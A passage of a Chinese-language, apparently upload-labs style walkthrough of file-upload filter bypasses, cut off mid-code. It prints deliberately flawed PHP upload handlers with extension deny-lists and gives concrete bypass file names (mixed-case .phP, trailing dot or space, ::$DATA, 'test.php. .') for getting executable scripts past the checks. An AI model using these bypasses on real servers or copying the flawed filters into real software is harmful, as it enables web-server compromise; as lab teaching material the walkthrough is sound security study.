class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>我们发现，服务器对所有类型文件的扩展都禁止上传，包括.htaccess</p>
<p>但是并没有对扩展名的大小写进行限制</p>
<p>源码中少了这一句，此代码把所有上传文件的后缀改成小写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>

<p>这里我们通过修改文件扩展名的大小写进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.phP</span><br><span class="line">XXX.PhP</span><br><span class="line">XXX.pHP</span><br><span class="line">xxx.PHp</span><br></pre></td></tr></table></figure>



<h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p>在Windows中文件后缀名末尾有点的会自动去掉点</p>
<p>例如“test.php.”,在Windows中会自动去掉末尾的点变成“test.php”</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>利用Windows的特性，以上代码中没有对点进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>

<p>这里我们把上传的文件后面加一个点即可绕过，例如<code>test.php.</code></p>
<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>在Windows中文件后缀名末尾有空格会自动去掉</p>
<p>例如<code>test.php </code>,在Windows中会自动去掉末尾的空格变成<code>test.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>以上代码中没有对空格进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>这里我们构造文件名<code>tets.php </code>，在最后添加一个空格即可绕过</p>
<h5 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h5><p>利用Windows+php的特性，如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p>
<p>例如:<code>&quot;test.php::$DATA&quot;</code>Windows会自动去掉末尾的<code>::$DATA</code>变成<code>&quot;test.php&quot;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>以上代码中没有对<code>::$DATA</code>进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>这里我们把上传的文件抓包，在最后添加<code>::$DATA</code>即可绕过，如<code>test.php::$DATA</code></p>
<h5 id="路径拼接绕过"><a href="#路径拼接绕过" class="headerlink" title="路径拼接绕过"></a>路径拼接绕过</h5><p>在代码中，会对文件名进行处理，删除了文件名末尾的点，进行去空处理等，再把处理过的文件名拼接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>这里我们构造文件名<code>test.php. .</code>(点+空格+点)，经过处理后。文件名变成<code>test.php.</code>，即可绕过</p>
<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>代码会将不符合的文件名和扩展名进行去除</p>
<p>例如<code>test.php</code>会变成<code>test.</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span 